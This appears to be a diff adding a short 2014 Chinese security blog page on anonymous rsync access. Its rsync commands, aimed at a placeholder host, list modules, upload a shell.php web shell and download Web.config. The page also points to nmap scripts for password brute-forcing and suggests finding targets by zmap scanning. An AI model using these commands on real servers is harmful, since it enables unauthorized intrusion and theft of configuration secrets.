@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="robots" content="index,follow" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="author" content="Chu" />
+    <meta name="description" content="Chu 的博客" />
+    <meta name="keywords" content="Chu,网络安全,编程开发" />
+
+    <title>rsync 匿名访问 - Chu&#39;s BLoG</title>
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/main.ee4a618df935f0a2b9d9e99663fcbefb3605c141a5835bb785b399615d5fac1e.css" integrity="sha256-7kphjfk18KK52emWY/y&#43;&#43;zYFwUGlg1u3hbOZYV1frB4=" />
+    <link rel="alternate" href="/index.xml" type="application/atom+xml" title="RSS" />
+  </head>
+
+  <body>
+    <header></header>
+    <main>
+<article>
+    <header>
+        <h1>rsync 匿名访问</h1>
+        <div>
+            <time datetime="2014-06-26 21:16:14 +0800 CST">发布时间: 2014-06-26 21:16</time>
+            <time datetime="2014-06-26 21:16:14 +0800 CST">更新时间: 2014-06-26 21:16</time>
+        </div>
+    </header>
+
+    <section>
+    <p>最近看 wooyun hot bugs，关注到这个问题，感觉引起的危害还是比较大的，而且很多管理员也没有注意到。</p>
+<p>基本语句：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>rsync X.X.X.X::                                             //列模块
+</span></span><span style="display:flex;"><span>rsync /tmp/shell.php X.X.X.X::web/                          //写文件
+</span></span><span style="display:flex;"><span>rsync -avz X.X.X.X::web/Web.config /tmp/Web.config          //下载文件
+</span></span></code></pre></div><p>有用的脚本：</p>
+<ul>
+<li>/usr/local/share/nmap/scripts/rsync-brute.nse //暴力破解密码</li>
+<li>/usr/local/share/nmap/scripts/rsync-list-modules.nse //列模块</li>
+</ul>
+<p>实例就不来了，zmap扫描下端口，很多的。</p>
+
+    </section>
+</article>
+</main>
+  </body>
+</html>
